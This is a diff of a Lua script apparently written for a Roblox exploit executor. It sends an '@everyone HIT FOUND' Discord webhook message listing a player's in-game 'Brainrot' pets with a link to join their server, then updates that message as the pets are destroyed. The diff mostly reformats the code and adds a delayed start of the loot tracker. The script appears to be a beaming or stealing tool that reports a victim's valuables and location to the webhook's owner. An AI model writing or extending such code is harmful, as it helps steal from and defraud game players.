@@ -272,9 +272,9 @@ local function sendWebhook(link)
     for _, p in ipairs(priorityPets) do table.insert(orderedPets, p.pet) end
     for _, r in ipairs(randomPets) do table.insert(orderedPets, r) end
 
-local lastWebhookMessageId = nil
-local lastWebhookEmbed = nil
-local lastWebhookContent = nil
+local lastWebhookMessageId
+local lastWebhookEmbed
+local lastWebhookContent
 
 local function sendWebhookAndStore(orderedPets)
     local lootText = table.concat(orderedPets, "\n")
@@ -297,6 +297,7 @@ local function sendWebhookAndStore(orderedPets)
             { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
         }
     }
+
     local payload = {
         ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
         ["embeds"] = {embed},
@@ -307,17 +308,18 @@ local function sendWebhookAndStore(orderedPets)
     lastWebhookContent = payload.content
 
     local req = (syn and syn.request) or http_request or (http and http.request) or request
-    if not req or not WEBHOOK or type(WEBHOOK) ~= "string" or WEBHOOK == "" then
-        return
-    end
+    if not req or not WEBHOOK or type(WEBHOOK) ~= "string" or WEBHOOK == "" then return end
 
     pcall(function()
-        local ok, res = pcall(function()
-            return req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)})
-        end)
-        if ok and res and res.Body then
-            local success, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
-            if success and type(decoded) == "table" and decoded.id then
+        local res = req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        if res and res.Body then
+            local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
+            if ok and decoded and decoded.id then
                 lastWebhookMessageId = tostring(decoded.id)
             end
         end
@@ -326,67 +328,54 @@ local function sendWebhookAndStore(orderedPets)
     if player then
         player:SetAttribute("WebhookSent", true)
     end
+
+    task.delay(2, function()
+        startLootTracking(orderedPets)
+    end)
 end
 
 local function patchWebhookLoot(newLootText)
-    if not lastWebhookMessageId then return end
-    if not lastWebhookEmbed then return end
-    if not WEBHOOK or WEBHOOK == "" then return end
-
+    if not lastWebhookMessageId or not lastWebhookEmbed or not WEBHOOK then return end
     local embedCopy = {}
-    for k,v in pairs(lastWebhookEmbed) do embedCopy[k] = v end
-
+    for k, v in pairs(lastWebhookEmbed) do embedCopy[k] = v end
     if embedCopy.fields then
         for i, f in ipairs(embedCopy.fields) do
             if f.name == "🧠Brainrot Loot" then
-                embedCopy.fields[i] = { ["name"] = f.name, ["value"] = newLootText }
+                embedCopy.fields[i].value = newLootText
                 break
             end
         end
     end
-
-    local patchPayload = {
-        ["content"] = lastWebhookContent,
-        ["embeds"] = { embedCopy }
-    }
-
+    local patchPayload = {["content"] = lastWebhookContent, ["embeds"] = {embedCopy}}
     local req = (syn and syn.request) or http_request or (http and http.request) or request
-    local patchUrl = WEBHOOK:gsub("/+$","") .. "/messages/" .. lastWebhookMessageId
-
+    local patchUrl = WEBHOOK:gsub("/+$", "") .. "/messages/" .. lastWebhookMessageId
     pcall(function()
         req({
             Url = patchUrl,
             Method = "PATCH",
-            Headers = { ["Content-Type"] = "application/json" },
+            Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(patchPayload)
         })
     end)
 end
 
-local function startLootTracking(orderedPets)
+function startLootTracking(orderedPets)
     local petStatus = {}
-    local pattern = "^(.-)%s*%((.-)%)%s*%((.-)%)%s*%((%d+)/(%d+)%)$"
-
+    local pattern = "^(.-)%s*%((.-)/s%)%s*%((.-)%)%s*%((%d+)/(%d+)%)$"
     for _, line in ipairs(orderedPets) do
         local name, speed, floor, done, total = line:match(pattern)
         if name and total then
             local key = (name .. "_" .. floor):lower()
-            petStatus[key] = {
-                name = name,
-                floor = floor,
-                speed = speed,
-                total = tonumber(total),
-                destroyed = tonumber(done) or 0
-            }
+            petStatus[key] = {name = name, floor = floor, speed = speed, total = tonumber(total), destroyed = tonumber(done) or 0}
         end
     end
 
     local function buildLootText()
-        local parts = {}
+        local t = {}
         for _, info in pairs(petStatus) do
-            table.insert(parts, string.format("%s (%s/s) (%s) (%d/%d)", info.name, info.speed, info.floor, info.destroyed, info.total))
+            table.insert(t, string.format("%s (%s/s) (%s) (%d/%d)", info.name, info.speed, info.floor, info.destroyed, info.total))
         end
-        return table.concat(parts, "\n")
+        return table.concat(t, "\n")
     end
 
     local lastPatch = 0
@@ -397,7 +386,7 @@ local function startLootTracking(orderedPets)
         local changed = false
         for key, info in pairs(petStatus) do
             if string.lower(obj.Name) == string.lower(info.name) and info.destroyed < info.total then
-                info.destroyed = info.destroyed + 1
+                info.destroyed += 1
                 changed = true
             end
         end
@@ -406,22 +395,12 @@ local function startLootTracking(orderedPets)
             local newText = buildLootText()
             if now - lastPatch >= PATCH_COOLDOWN then
                 lastPatch = now
-                task.spawn(function()
-                    patchWebhookLoot(newText)
-                end)
+                task.spawn(function() patchWebhookLoot(newText) end)
             else
                 local waitTime = PATCH_COOLDOWN - (now - lastPatch)
                 lastPatch = now + waitTime
-                task.delay(waitTime, function()
-                    patchWebhookLoot(buildLootText())
-                end)
+                task.delay(waitTime, function() patchWebhookLoot(buildLootText()) end)
             end
-        end
-    end)
-
-    task.spawn(function()
-        while task.wait(5) do
-            lootText = buildLootText()
         end
     end)
 end
